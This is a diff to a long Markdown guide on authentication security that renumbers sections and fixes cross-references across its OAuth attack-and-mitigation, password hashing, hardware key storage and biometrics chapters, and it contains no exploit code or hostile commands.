@@ -226,7 +226,7 @@ related: []
     - [17.10 Behavioural Biometrics (Continuous Authentication)](#1710-behavioural-biometrics-continuous-authentication)
     - [17.11 Biometric Template Protection and Privacy](#1711-biometric-template-protection-and-privacy)
     - [17.12 Regulatory Landscape](#1712-regulatory-landscape)
-    - [17.11 Continuous Authentication and Behavioral Biometrics](#1711-continuous-authentication-and-behavioral-biometrics)
+    - [17.13 Continuous Authentication and Behavioral Biometrics](#1713-continuous-authentication-and-behavioral-biometrics)
   </details>
   - <details><summary><a href="#18-device-attestation-platform-mechanics">18. Device Attestation: Platform Mechanics</a></summary>
 
@@ -6127,7 +6127,7 @@ The following table compares the OAuth/OIDC/FAPI capabilities of the five most w
 
 #### 4.1 OAuth 2.1 Consolidation and FAPI 2.0 Security Profile
 
-##### 3.7.1 FAPI 2.0 Security Profile
+##### 4.1.1 FAPI 2.0 Security Profile
 
 The Financial-grade API (FAPI) 2.0 Security Profile, published by the OpenID Foundation, constrains OIDC and OAuth 2.0 for environments where the consequences of security failure are severe — financial services (open banking), healthcare (patient data), government identity, and other high-value APIs. For the regulatory context of FAPI 2.0 in EU open banking — including PSD2/PSD3 Strong Customer Authentication requirements and their mapping to FAPI 2.0 mechanisms — see §5.
 
@@ -6516,7 +6516,7 @@ Satisfied that the caller legitimately possesses both the access token and the p
 
 OAuth 2.0 and OpenID Connect have been the subject of extensive security research. This section catalogues the most significant protocol-specific vulnerabilities. For the broader authentication attack taxonomy, see §20.
 
-##### 3.9.1 Token Leakage Vectors
+##### 4.2.1 Token Leakage Vectors
 
 Token leakage is the most common class of OAuth vulnerabilities — it occurs when access tokens, authorization codes, or other sensitive credentials are exposed through channels not intended for token transport.
 
@@ -6585,7 +6585,7 @@ flowchart TD
     style NoteBFF text-align:left
 ```
 
-##### 3.9.2 CSRF and redirect_uri Attacks
+##### 4.2.2 CSRF and redirect_uri Attacks
 
 **Open redirect via redirect_uri** — If the authorization server accepts a `redirect_uri` that differs from the client's registered callback URLs, an attacker can redirect the authorization code to a malicious endpoint. OAuth 2.1 mandates **exact string matching** of the `redirect_uri` against registered values (RFC 9700 §4.1.1). RFC 9700 further recommends that authorization servers reject authorization requests with `redirect_uri` parameters entirely when only one redirect URI is registered for the client.
 
@@ -6773,13 +6773,13 @@ The victim, now logged into what they believe is their own account, performs sen
 
 </details>
 
-##### 3.9.3 PKCE Bypass Techniques
+##### 4.2.3 PKCE Bypass Techniques
 
 **PKCE downgrade attack** — If the authorization server accepts both `S256` and `plain` code challenge methods, an attacker who intercepts the authorization request can remove the `code_challenge_method` parameter or change it from `S256` to `plain`. If the authorization server falls back to `plain` when no method is specified, the attacker can use the intercepted `code_challenge` value as the `code_verifier`. **Mitigation:** Authorization servers MUST reject `code_challenge_method=plain` in FAPI 2.0 environments. OAuth 2.1 deprecates `plain` and recommends `S256` as the only acceptable method.
 
 **PKCE code reuse** — If the authorization server does not properly enforce single-use of authorization codes, an attacker who intercepts the code can use it without the PKCE verifier. **Mitigation:** RFC 9700 §4.1.2 states that if the authorization code is used more than once, the authorization server MUST revoke all tokens issued based on that code and reject all subsequent uses.
 
-##### 3.9.4 Refresh Token Rotation Bypass
+##### 4.2.4 Refresh Token Rotation Bypass
 
 **Race condition bypass** — If the legitimate client and an attacker both use the same refresh token concurrently, the authorization server may process both requests before either invalidation takes effect. **Mitigation:** Use atomic operations (database transactions with row-level locking) to ensure that refresh token validation and rotation are atomic.
 
@@ -6819,7 +6819,7 @@ flowchart TD
 
 **Network retry false positive** — A legitimate client may retry a token refresh request due to a network timeout after the server has already processed it. The retry uses the same (now-invalidated) refresh token, triggering reuse detection and family revocation — a false positive that terminates the user's legitimate session. **Mitigations:** Use idempotent token refresh at the client — only retry if the server response was definitely not received (e.g., TCP connection reset, not HTTP 500). Implement a short grace period (5–10 seconds) before triggering family revocation, during which reuse is logged but not acted upon. Use a retry counter — allow 1–2 retries within the grace period before revoking (Lucid, 2023).
 
-##### 3.9.5 Authorization Server Confusion Attacks
+##### 4.2.5 Authorization Server Confusion Attacks
 
 **IdP mix-up** — When a client is registered with multiple authorization servers, an attacker can trick the client into sending an authorization request to the wrong authorization server, causing the client to accept tokens from an untrusted issuer. **Mitigation:** Include the `iss` (issuer) parameter in the authorization request — the authorization server MUST include `iss` in the authorization response, and the client MUST verify it matches the expected issuer (RFC 9207). Validate the `iss` claim in the ID Token against the expected issuer URL from the discovery document.
 
@@ -6879,7 +6879,7 @@ flowchart TD
     style Note2 text-align:left
 ```
 
-##### 3.9.6 RFC 9700 Key Recommendations
+##### 4.2.6 RFC 9700 Key Recommendations
 
 RFC 9700 ("OAuth 2.0 Security Best Current Practice", BCP 240, January 2025) consolidates security guidance from a decade of OAuth deployment experience:
 
@@ -9679,7 +9679,7 @@ graph LR
 
 The cost factor should be calibrated to achieve **250–1,000 ms** per hash on the target server hardware. Verify empirically — do not rely on published benchmarks, as hardware varies significantly.
 
-##### 9.2.2a PBKDF2
+##### 9.2.3 PBKDF2
 
 **PBKDF2** (Password-Based Key Derivation Function 2, RFC 8018) applies HMAC in a loop to derive a key from a password. Despite being NIST-approved and FIPS-140 validated, it is the weakest of the four common password hashing algorithms because it has no memory-hardness property — a GPU can compute millions of PBKDF2-HMAC-SHA256 evaluations per second because each evaluation needs only a few hundred bytes of state.
 
@@ -9705,7 +9705,7 @@ Where `c` = iteration count, `dklen` = desired key length, `hlen` = HMAC output 
 
 **When PBKDF2 is unavoidable:** FIPS 140-2/FIPS 140-3 validated environments (US federal systems, financial services with regulatory mandates) may require PBKDF2 because bcrypt and Argon2 lack FIPS certification. If mandated, use SHA-512 as the HMAC hash (faster than SHA-256 on 64-bit systems) and maximise the iteration count within the latency budget.
 
-##### 9.2.3 scrypt
+##### 9.2.4 scrypt
 
 **scrypt** (2009, Colin Percival, RFC 7914) extends the adaptive cost concept to include **memory hardness** — it is designed to require a large amount of memory in addition to CPU time, making it resistant to GPU and ASIC attacks where compute-per-watt is high but memory-per-chip is limited.
 
@@ -9741,7 +9741,7 @@ graph LR
     DK --- DK_L["Base64 Derived Key"]
 ```
 
-##### 9.2.4 Argon2
+##### 9.2.5 Argon2
 
 **Argon2** (2015, Alex Biryukov, Daniel Dinu, Dmitry Khovratovich) is the winner of the Password Hashing Competition (PHC, §9.4) and the current state-of-the-art password hashing algorithm. It provides tunable memory hardness, time hardness, and parallelism, and addresses weaknesses in both bcrypt and scrypt.
 
@@ -9866,7 +9866,7 @@ graph LR
     DK --- DK_L["Base64 Derived Key"]
 ```
 
-##### 9.2.5 Algorithm Comparison
+##### 9.2.6 Algorithm Comparison
 
 | Property | bcrypt | PBKDF2 | scrypt | Argon2id |
 |:---------|:-------|:-------|:-------|:---------|
@@ -9885,7 +9885,7 @@ graph LR
 
 **Decision hierarchy for production systems:** Argon2id → bcrypt (cost ≥ 12) → scrypt → PBKDF2-HMAC-SHA512. Use Argon2id for all new systems unless FIPS compliance is required. Use bcrypt if Argon2id is not available in the platform library. Use scrypt only if neither Argon2id nor bcrypt is available. Use PBKDF2-HMAC-SHA512 only if FIPS 140-2/3 validation is mandatory. Never use MD5, SHA-1, SHA-256, DES crypt, or any unsalted fast hash.
 
-##### 9.2.6 Password Authentication Flow with Hash Verification
+##### 9.2.7 Password Authentication Flow with Hash Verification
 
 The following sequence diagram illustrates the complete password authentication lifecycle — from registration through login and optional hash upgrade:
 
@@ -10232,7 +10232,7 @@ NIST SP 800-63B Revision 4 (second public draft August 2024, final anticipated m
 
 For production systems, the recommended approach is a **layered blocklist**: the HIBP online API for breach detection (privacy-preserving, always current) combined with a local static list of common patterns and context-specific values (instant, no network dependency).
 
-##### 9.3.1a Entropy Analysis: Complexity vs. Length
+##### 9.3.2 Entropy Analysis: Complexity vs. Length
 
 The fundamental tension in password policy is between **composition rules** (requiring character class diversity) and **length** (allowing longer, simpler passwords). NIST's position is clear: length matters more than complexity.
 
@@ -10293,7 +10293,7 @@ flowchart LR
 
 The lesson: **a longer passphrase of common words is stronger than a shorter "complex" password** because human-predictable patterns negate the entropy benefit of character diversity. Composition rules give a false sense of security while making passwords harder to remember.
 
-##### 9.3.2 HIBP (Have I Been Pwned) k-Anonymity API
+##### 9.3.3 HIBP (Have I Been Pwned) k-Anonymity API
 
 The HIBP Pwned Passwords API, created by Troy Hunt, provides a practical implementation of breach-checking that preserves user privacy through a **k-anonymity model**. The API contains over 900 million compromised passwords sourced from real-world data breaches. The critical design challenge is: how does a service check whether a password appears in the breach corpus without sending the password (or its full hash) to a third party?
 
@@ -10474,7 +10474,7 @@ Content-Type: application/json
 | **Network eavesdropper cannot identify password** | Even intercepting the API request reveals only the 5-character prefix (TLS protects the response body) |
 | **No registration required** | The API is free, requires no API key, and imposes no authentication — minimising the metadata footprint |
 
-##### 9.3.3 Credential Stuffing Mitigation
+##### 9.3.4 Credential Stuffing Mitigation
 
 Credential stuffing is the automated injection of known username/password pairs (obtained from previous breaches) into login forms. Unlike brute-force attacks that guess passwords, credential stuffing uses **real credentials** — success rates of 0.1–2% are typical, and given breach corpora containing billions of pairs, this translates to millions of compromised accounts.
 
@@ -10482,7 +10482,7 @@ Mitigation operates at multiple layers:
 
 | Layer | Technique | Mechanism | Tradeoff |
 |:------|:---------|:----------|:---------|
-| **Credential validation** | Breach-list checking at registration/change (§9.3.2) | Prevents users from setting known-compromised passwords | Does not protect existing accounts with pre-breach passwords |
+| **Credential validation** | Breach-list checking at registration/change (§9.3.3) | Prevents users from setting known-compromised passwords | Does not protect existing accounts with pre-breach passwords |
 | **Rate limiting** | IP-based and account-based throttling | Limits the number of authentication attempts per time window | Attackers distribute across botnets; too aggressive limits lock out legitimate users |
 | **Progressive delays** | Exponentially increasing delays after failed attempts (e.g., 1s → 2s → 4s → 8s) | Slows brute-force without hard lockout | Attackers may accept the delay if the reward is high enough |
 | **Account lockout** | Temporary lockout after N failed attempts (e.g., 30 min after 5 failures) | Stops brute-force against targeted accounts | Denial-of-service risk — attackers can deliberately trigger lockouts against legitimate users |
@@ -10491,7 +10491,7 @@ Mitigation operates at multiple layers:
 | **Bot detection** | Behavioural analysis (mouse movement patterns, keystroke dynamics, request timing) | Identifies non-human interaction patterns at the network/application layer | Sophisticated bots mimic human behaviour; false positives possible |
 | **Credential intelligence** | Real-time breach monitoring and proactive forced password resets | Resets passwords for accounts whose credentials appear in new breaches | Requires monitoring breach intelligence feeds; user communication overhead |
 
-##### 9.3.4 FHE-Based Private Breach Checking
+##### 9.3.5 FHE-Based Private Breach Checking
 
 Fully Homomorphic Encryption (FHE) enables computation on encrypted data without decryption — a property that theoretically enables **private set intersection (PSI)** for breach checking: the client encrypts the password hash, the server computes whether it appears in the breach corpus *while the data remains encrypted*, and returns only the encrypted match/no-match result.
 
@@ -10508,7 +10508,7 @@ True FHE-based PSI for password breach checking remains **premature for producti
 
 **Assessment:** FHE-based breach checking is an active research area with long-term potential, but the HIBP k-anonymity model represents the practical state of the art. For production systems, HIBP's approach provides sufficient privacy guarantees with negligible performance overhead.
 
-##### 9.3.5 Password Managers
+##### 9.3.6 Password Managers
 
 Password managers are the most practical tool for enabling users to maintain unique, high-entropy passwords across all accounts. They generate, store, and autofill credentials, eliminating the human memory constraint that drives password reuse.
 
@@ -10606,7 +10606,7 @@ Naive entropy dramatically overestimates `P@ssword1` because it treats each char
 **Integration guidance:**
 
 - Use zxcvbn as a **client-side feedback tool**, not a server-side gate — it provides real-time feedback as the user types, guiding them toward stronger choices
-- Server-side enforcement should rely on **length requirements** (≥ 15 characters per NIST Rev. 4) and **blocklist checking** (§9.3.2), not on strength estimation scores
+- Server-side enforcement should rely on **length requirements** (≥ 15 characters per NIST Rev. 4) and **blocklist checking** (§9.3.3), not on strength estimation scores
 - zxcvbn adds ~800 KB to the client-side bundle (including dictionaries) — lazy-load it on password creation/change forms only
 
 ##### 9.5.4 Account Lockout vs. Progressive Delays vs. CAPTCHA
@@ -14539,13 +14539,15 @@ Where:
 
 **Dynamic truncation (RFC 4226 §9.3):**
 
-$$\begin{aligned}
+$$
+\begin{aligned}
 \text{digest} &= \text{HMAC-SHA-}x(K, \text{DataInput}) \\
 \text{offset} &= \text{digest}[19] \;\&\; 0x0F \\
 \text{binary} &= (\text{digest}[\text{offset}] \;\&\; 0x7F) \ll 24 \;|\; \text{digest}[\text{offset}{+}1] \ll 16 \\
                &\quad|\; \text{digest}[\text{offset}{+}2] \ll 8 \;|\; \text{digest}[\text{offset}{+}3] \\
 \text{OTP} &= \text{binary} \bmod 10^d
-\end{aligned}$$
+\end{aligned}
+$$
 
 The low 4 bits of the last byte of the digest select a 4-byte window; the MSB of the first byte is masked to 0 to ensure a positive integer; the resulting 31-bit value is reduced modulo $10^d$. The 31-bit binary space ($2^{31} \approx 2.15 \times 10^9$) provides substantial headroom over any practical digit count — a 10-digit code maps to only ~4,660 binary windows out of $2^{31}$ possible values.
 
@@ -17268,7 +17270,7 @@ WebAuthn itself does not include a built-in clone detection mechanism. However, 
 1. **Geographic anomaly detection.** If a credential is used from two geographically distant locations within a short time window, the RP can flag the credential as potentially cloned. This is the most common detection technique in production.
 2. **Counter-based detection.** The `authenticatorData` contains a 32-bit signature counter that monotonically increases with each authentication. If the RP observes the same credential with a counter value lower than a previously observed value, the credential has been cloned (or the authenticator's storage was corrupted). RPs should validate the signature counter on every authentication.
 3. **Device attestation.** If the RP uses enterprise attestation (§14.16.3), it can verify that the authenticator is a managed device. A cloned credential loaded onto an unmanaged device would fail attestation.
-4. **Behavioral biometrics.** Continuous authentication systems (§17.11) can detect behavioral anomalies (typing pattern, mouse movement) that may indicate a different user is operating the device.
+4. **Behavioral biometrics.** Continuous authentication systems (§17.13) can detect behavioral anomalies (typing pattern, mouse movement) that may indicate a different user is operating the device.
 
 **Signature counter — practical considerations:**
 
@@ -17714,7 +17716,7 @@ The protection problem is **asymmetric**. Server-side security benefits from a c
 
 Banking and financial applications universally implement their own PIN entry mechanisms rather than relying on the operating system's native lock screen passcode. This architectural choice is not cosmetic — it reflects regulatory, security, and cryptographic requirements that the OS-level PIN cannot satisfy.
 
-##### 15.1.1 Why Banking Apps Don't Use the OS-Level PIN
+##### 16.1.1 Why Banking Apps Don't Use the OS-Level PIN
 
 The device unlock PIN/passcode (iOS passcode, Android lock screen PIN) serves a fundamentally different purpose than a banking PIN. The OS PIN unlocks the device and — by extension — decrypts the device's data protection keychain. A banking PIN must serve as an **independent credential** bound to the financial institution's authentication domain, not to the device's general-purpose unlock state.
 
@@ -17728,7 +17730,7 @@ Furthermore, Article 9(3)(c) mandates that communication of personalised securit
 
 **Audit trail isolation:** Financial regulators (EBA, BaFin, DNB, AFM) require that authentication events be logged with sufficient granularity to prove which credential was used, when, and by what mechanism. When the app controls the PIN entry flow, every keystroke timing, entry attempt, and lockout event is logged within the app's audit infrastructure. OS-level authentication provides only a binary "authenticated / not authenticated" signal — insufficient for regulatory examination.
 
-##### 15.1.2 Randomised Keypad Layouts
+##### 16.1.2 Randomised Keypad Layouts
 
 Banking apps display PIN entry keypads with **randomised digit positions** — the digits 0–9 are shuffled into random positions on each PIN entry screen. This countermeasure addresses two threat vectors:
 
@@ -17804,7 +17806,7 @@ flowchart TD
 
 The randomisation must use a CSPRNG (not `Math.random()` or equivalent weak PRNGs) and the layout must be regenerated on every display — including after a failed attempt, app backgrounding, or screen lock.
 
-##### 15.1.3 Secure Keyboard Implementations
+##### 16.1.3 Secure Keyboard Implementations
 
 Banking apps implement **custom in-app keyboards** that bypass the operating system's keyboard input stack entirely. This prevents:
 
@@ -17832,7 +17834,7 @@ Banking apps implement **custom in-app keyboards** that bypass the operating sys
 | 12 (S) | Accessibility service audit logging | Audit logs not user-visible by default |
 | 13 (Tiramisu) | Blocking accessibility for password entry | Only effective for standard password hints |
 
-##### 15.1.4 PIN-to-Key Derivation
+##### 16.1.4 PIN-to-Key Derivation
 
 The user's PIN — typically 4–6 digits — contains insufficient entropy for direct cryptographic use (10⁴ to 10⁶ possible values). Banking apps never use the PIN directly as a cryptographic key. Instead, the PIN is combined with device-specific entropy through a key derivation function to produce a high-entropy key:
 
@@ -17934,7 +17936,7 @@ $$t_{\text{GPU}} = \frac{3.1 \times 10^9}{2 \times 10^6} \approx 1550 \text{ sec
 This motivates memory-hard KDFs (Argon2id) for PIN protection, as they are significantly more resistant to GPU acceleration.
 </details>
 
-##### 15.1.5 PSD2 Secure Execution Environment Requirements
+##### 16.1.5 PSD2 Secure Execution Environment Requirements
 
 PSD2 RTS Article 8 requires that payment service providers ensure the confidentiality and integrity of the payer's personalised security credentials — including during authentication and when processing and routing. Article 9(3)(a) requires that the generation of authentication codes be performed in a **secure execution environment (SEE)**.
 
@@ -18400,7 +18402,7 @@ flowchart TD
     style SE text-align:left
 ```
 
-##### 15.2.1 Apple Secure Enclave (iOS/macOS)
+##### 16.2.1 Apple Secure Enclave (iOS/macOS)
 
 The Secure Enclave is a dedicated **security coprocessor** physically isolated from the application processor on Apple's System-on-Chip (SoC). Introduced with the Apple A7 chip (iPhone 5s, 2013), the Secure Enclave is present on all modern Apple devices — iPhone, iPad, Mac (Apple Silicon and T2-equipped Intel Macs), Apple Watch, Apple TV, and HomePod.
 
@@ -18456,7 +18458,7 @@ let attributes: [String: Any] = [
 let privateKey = SecKeyCreateRandomKey(attributes as CFDictionary, nil)
 ```
 
-##### 15.2.2 Android StrongBox/TEE
+##### 16.2.2 Android StrongBox/TEE
 
 Android provides two tiers of hardware-backed key storage through the Android Keystore API:
 
@@ -18539,7 +18541,7 @@ Only **Class 3 (Strong) biometrics** — also referred to as `BIOMETRIC_STRONG` 
 - Android OS version and patch level at time of key generation
 - Whether user authentication is required
 
-##### 15.2.3 TPM 2.0 (Windows, Linux)
+##### 16.2.3 TPM 2.0 (Windows, Linux)
 
 The Trusted Platform Module (TPM) is a security coprocessor standardised by the Trusted Computing Group (TCG) as ISO/IEC 11889. TPM 2.0 (the current version, mandatory for Windows 11 certification) provides hardware root-of-trust functionality for platform integrity measurement, key storage, and cryptographic operations.
 
@@ -18653,7 +18655,7 @@ flowchart TD
 
 **Linux integration:** The `tpm2-tss` (TPM Software Stack) and `tpm2-pkcs11` provide Linux applications with access to TPM key storage via the PKCS#11 interface — enabling FIDO2 authenticator implementations, client certificate authentication (mTLS), and SSH key storage using TPM-resident keys.
 
-##### 15.2.4 Secure Element (SE): Dedicated Tamper-Resistant Chip
+##### 16.2.4 Secure Element (SE): Dedicated Tamper-Resistant Chip
 
 A Secure Element is a tamper-resistant integrated circuit card (ICC) that provides a self-contained computing environment with its own CPU, memory (RAM, ROM, EEPROM/Flash), and cryptographic coprocessor. SEs are certified to high security assurance levels — typically Common Criteria (CC) EAL5+ or FIPS 140-3 Level 3 or higher.
 
@@ -18686,7 +18688,7 @@ GlobalPlatform defines the lifecycle management framework for secure elements:
 
 **Certification:** Secure elements undergo formal security evaluation — typically CC EAL5+ under a protection profile such as BSI PP-0084 (Secure Signature Creation Device) or ANSSI PP (Java Card System — Open Configuration). This evaluation includes physical attack resistance testing: side-channel analysis (SPA/DPA — Simple/Differential Power Analysis), fault injection (laser, voltage glitching), invasive probing (microprobing of die contacts), and reverse engineering resistance.
 
-##### 15.2.4.1 Memory Access Control Mechanisms
+##### 16.2.4.1 Memory Access Control Mechanisms
 
 Each hardware isolation architecture implements memory isolation differently at the hardware level:
 
@@ -18698,7 +18700,7 @@ Each hardware isolation architecture implements memory isolation differently at 
 
 **TPM:** A discrete TPM communicates via SPI or LPC bus with no shared memory. Firmware TPMs (fTPM, Intel PTT) run inside a CPU-isolated execution environment with dedicated memory regions. TPM memory access is controlled through the host bus interface protocol — the TPM only accepts well-defined commands from the TCG specification and never exposes internal state.
 
-##### 15.2.4.2 Side-Channel Countermeasures
+##### 16.2.4.2 Side-Channel Countermeasures
 
 Side-channel attacks exploit physical leakage — power consumption, electromagnetic emanation, timing — to recover secret keys. The two primary classes are:
 
@@ -18724,7 +18726,7 @@ All hardware architectures implement some subset of these countermeasures. Secur
 
 The affected vendors issued firmware updates. This research underscores that constant-time ECDSA implementation is not merely a software best practice but a hardware-authenticator security requirement — particularly for device-bound passkeys at AAL3, where a compromised private key enables credential cloning without physical access to the authenticator (see §14.4 for the full attack taxonomy).
 
-##### 15.2.5 Hardware Security Architecture Comparison
+##### 16.2.5 Hardware Security Architecture Comparison
 
 | Dimension | Apple Secure Enclave | Android StrongBox | Android TEE | TPM 2.0 | Secure Element (SE) | Intel SGX |
 |:----------|:--------------------|:------------------|:-----------|:--------|:-------------------|:----------|
@@ -18819,7 +18821,7 @@ Hardware security claims require independent, standardised validation. Three cer
 
 In practice, hardware security modules used in client-side protection (TPMs, secure elements, HSMs) typically hold **both** certifications — FIPS 140-3 for the cryptographic module and Common Criteria for the broader product. TEE implementations are evaluated under Common Criteria with GlobalPlatform Protection Profiles.
 
-##### 15.3.1 FIPS 140-3: Federal Information Processing Standard
+##### 16.3.1 FIPS 140-3: Federal Information Processing Standard
 
 FIPS 140-3 (effective September 2019, mandatory for new submissions since April 2022, succeeding FIPS 140-2) defines four security levels for cryptographic modules. The standard is maintained by NIST and validated through the **Cryptographic Module Validation Program (CMVP)**, operated jointly by NIST (US) and CCCS (Canada).
 
@@ -18853,7 +18855,7 @@ The validation certificate number (e.g., CMVP #3913) is the definitive reference
 
 **Relevance:** FIPS 140-3 validation is required for cryptographic modules used in US federal systems (under FISMA), and is widely referenced in financial services (PCI DSS recommends FIPS-validated encryption), healthcare (HIPAA's "addressable" encryption requirement typically points to FIPS), and critical infrastructure regulations. International equivalents include ITSEC (historical, EU) and JCMVP (Japan).
 
-##### 15.3.2 Common Criteria (ISO/IEC 15408)
+##### 16.3.2 Common Criteria (ISO/IEC 15408)
 
 The Common Criteria for Information Technology Security Evaluation (ISO/IEC 15408) is an international standard for evaluating the security properties of IT products. Unlike FIPS 140-3 (which is specific to cryptographic modules), Common Criteria evaluates the broad security functionality of a Target of Evaluation (TOE) — which may be an operating system, a secure element, a firewall, a smart card, or any security-relevant product.
 
@@ -18884,7 +18886,7 @@ Key protection profiles for authentication hardware:
 
 **Relevance:** Common Criteria certification is required for secure elements used in eIDAS qualified electronic signature creation (Article 29 of eIDAS requires a QSCD certified against the relevant PP). Banking SEs used for payment card personalisation (EMV) typically require CC EAL4+ or EAL5+. Government ID cards (e-passports, national ID) require CC EAL5+ for the SE component.
 
-##### 15.3.3 GlobalPlatform TEE and SE Protection Profiles
+##### 16.3.3 GlobalPlatform TEE and SE Protection Profiles
 
 GlobalPlatform — the industry consortium that defines SE lifecycle management standards (§15.2.4) — also publishes **protection profiles** for evaluating TEE and SE security under the Common Criteria framework.
 
@@ -18914,7 +18916,7 @@ TEE certification is less common than SE certification — the GlobalPlatform TE
 
 When a user-supplied credential (password, PIN) must be transformed into cryptographic key material, or when cryptographic keys must be derived, wrapped, or shared across security boundaries, the following schemes provide the standardised mechanisms.
 
-##### 15.4.1 PBKDF2: Password-Based Key Derivation Function 2 (RFC 8018)
+##### 16.4.1 PBKDF2: Password-Based Key Derivation Function 2 (RFC 8018)
 
 PBKDF2 (defined in PKCS #5 v2.1 / RFC 8018) derives a cryptographic key from a password by applying a pseudorandom function (PRF) — typically HMAC-SHA-256 or HMAC-SHA-1 — iteratively to the password and a salt.
 
@@ -18948,7 +18950,7 @@ where:
 
 **Limitation:** PBKDF2 is a CPU-bound KDF — it does not require significant memory. This means it can be efficiently parallelised on GPUs, FPGAs, and ASICs — making it vulnerable to hardware-accelerated brute-force attacks. For password hashing in non-FIPS environments, Argon2 (§9.2) is the recommended alternative because it requires configurable memory (memory-hard), making hardware-accelerated attacks prohibitively expensive.
 
-##### 15.4.2 HKDF: HMAC-Based Extract-and-Expand Key Derivation Function (RFC 5869)
+##### 16.4.2 HKDF: HMAC-Based Extract-and-Expand Key Derivation Function (RFC 5869)
 
 HKDF is designed for deriving **multiple keys** from a single shared secret or key material. Unlike PBKDF2 (which is designed for low-entropy passwords), HKDF assumes its input already has sufficient entropy (e.g., a Diffie-Hellman shared secret, a pre-shared key).
 
@@ -18976,7 +18978,7 @@ iv             = HKDF-Expand(PRK, "iv", 12)         // 96-bit IV for AES-GCM
 - **Signal Protocol** — Double Ratchet key derivation uses HKDF to derive message keys from chain keys
 - **FIDO2 extensions** — CTAP2 hmac-secret extension uses HKDF for key derivation
 
-##### 15.4.3 Key Wrapping: AES-KWP (RFC 5649)
+##### 16.4.3 Key Wrapping: AES-KWP (RFC 5649)
 
 Key wrapping provides **confidentiality and integrity protection** for cryptographic keys during transport or storage outside their primary security boundary. AES Key Wrap with Padding (AES-KWP, RFC 5649) is the NIST-approved mechanism.
 
@@ -18997,7 +18999,7 @@ The wrapped output is 8 bytes longer than the input (for the integrity check val
 - **Key backup and escrow:** Enterprise key management systems wrap user keys under a master KEK for escrow purposes — the wrapped key can be stored in a database without exposing the plaintext key material
 - **TPM key hierarchy:** TPM key hierarchy (§15.2.3) uses conceptually similar wrapping — child keys are encrypted under their parent key in the hierarchy
 
-##### 15.4.4 Key Sealing to Platform State (TPM)
+##### 16.4.4 Key Sealing to Platform State (TPM)
 
 TPM key sealing (§15.2.3) binds a key to the platform's measured boot state — the key can only be unsealed when the platform's PCR values match the values recorded at sealing time. The key hierarchy (§15.2.3, Figure: Key hierarchies) defines the wrapping chain: the Storage Root Key (SRK) wraps storage keys, which in turn wrap signing, encryption, and sealed data objects.
 
@@ -19028,7 +19030,7 @@ If any component in the boot chain has been modified since sealing (firmware upd
 
 **BitLocker integration:** Windows BitLocker Full Volume Encryption uses TPM key sealing as its default key protector. The Volume Master Key (VMK) is sealed to PCR[7] (Secure Boot state) and PCR[11] (BitLocker access control). When the system boots normally (Secure Boot enabled, original bootloader), the TPM unseals the VMK, which decrypts the disk encryption key — the user sees seamless, transparent full-disk encryption. If Secure Boot is disabled or the bootloader is tampered with, the TPM refuses to unseal, and BitLocker requires the recovery key.
 
-##### 15.4.5 Split Knowledge and Multi-Party Computation
+##### 16.4.5 Split Knowledge and Multi-Party Computation
 
 For root key custody — protecting the master keys of HSMs, certificate authorities, and enterprise key management systems — split-knowledge mechanisms ensure that no single person holds the complete key.
 
@@ -19073,7 +19075,7 @@ Unlike knowledge or possession factors, biometric traits are **permanently bound
 #### 17.1 Fingerprint Recognition
 Fingerprint recognition is the oldest and most widely deployed biometric modality in consumer devices. The technology relies on the uniqueness and persistence of friction ridge patterns — the raised skin on the fingertip surface that develops during foetal development (around week 10–16 of gestation) and remains stable throughout life, barring injury or disease.
 
-##### 16.1.1 Sensor Technologies
+##### 17.1.1 Sensor Technologies
 
 Three sensor technologies dominate the fingerprint recognition landscape, each with distinct physical principles, form factors, and security characteristics:
 
@@ -19118,7 +19120,7 @@ For a 3 MHz centre frequency with 1 MHz bandwidth, $\Delta z \approx 0.77$ mm �
 
 </details>
 
-##### 16.1.2 Minutiae-Based Matching
+##### 17.1.2 Minutiae-Based Matching
 
 Fingerprint matching algorithms do not compare raw fingerprint images. Instead, they extract **minutiae** — distinctive local features of the ridge pattern — and compare the spatial relationships between these features. The minutiae extraction and matching approach is the dominant algorithm family, standardised in ISO/IEC 19794-2 (Fingerprint Minutiae Data).
 
@@ -19147,7 +19149,7 @@ A typical fingerprint yields 20–80 minutiae points. The template stores the co
 
 **Minutiae matching algorithm:** Template matching computes the similarity between an enrollment minutiae set $E = \\\{(x_i^e, y_i^e, \theta_i^e)\\\}$ and a query set $Q = \\\{(x_j^q, y_j^q, \theta_j^q)\\\}$. The algorithm must account for non-linear distortion (elastic deformation from varying finger pressure), partial overlap (different sensor regions captured at enrollment vs. authentication), and rotation/translation between coordinate frames. The standard approach (Jain et al., 1997) uses alignment-based matching: (1) select a reference minutiae pair from $E$ and $Q$, (2) estimate the rigid transformation $(\Delta x, \Delta y, \Delta \theta)$ that aligns the pair, (3) transform all query minutiae by the estimated transformation, (4) count matching minutiae within a tolerance box ($r_{xy}$ for spatial distance, $r_\theta$ for angular distance), and (5) repeat for multiple reference pairs, retaining the maximum match count. The similarity score is typically the normalised matched minutiae count; a threshold on this score determines accept/reject.
 
-##### 16.1.2a Signal Processing Pipeline
+##### 17.1.3 Signal Processing Pipeline
 
 Regardless of sensor technology, fingerprint recognition follows a standard seven-stage processing pipeline between raw image capture and template generation:
 
@@ -19199,7 +19201,7 @@ flowchart TD
     style S7 text-align:left
 ```
 
-##### 16.1.3 Performance Metrics
+##### 17.1.4 Performance Metrics
 
 Biometric system performance is characterised by three fundamental metrics, defined in ISO/IEC 19795-1 (Biometric Testing and Reporting):
 
@@ -19218,7 +19220,7 @@ xychart-beta
     line "FAR (False Acceptance Rate)" [100, 98, 90, 75, 55, 35, 20, 10, 5, 2, 1]
 ```
 
-##### 16.1.4 Standard Compliance
+##### 17.1.5 Standard Compliance
 
 **ISO/IEC 19794-2 — Fingerprint Minutiae Data:**
 
@@ -19232,7 +19234,7 @@ In consumer mobile device contexts, vendor-proprietary template formats are used
 #### 17.2 Facial Recognition (2D, 3D/Structured Light, Infrared)
 Facial recognition encompasses a broad range of technologies — from basic 2D camera-based matching (vulnerable to photographs) to advanced 3D structured light systems (resistant to all known 2D and most 3D attacks). The security characteristics vary dramatically across implementations, and the distinction between "face unlock" on a budget Android phone and Apple's Face ID is a difference in kind, not merely degree.
 
-##### 16.2.1 2D Camera-Based Facial Recognition
+##### 17.2.1 2D Camera-Based Facial Recognition
 
 The simplest form of facial recognition uses the standard front-facing RGB camera to capture a 2D image of the user's face. The image is compared against a stored reference using neural network-based feature extraction — the system encodes the facial geometry (distance between eyes, nose shape, jawline contour) into a mathematical embedding vector and compares it against the enrolled template using cosine similarity or Euclidean distance.
 
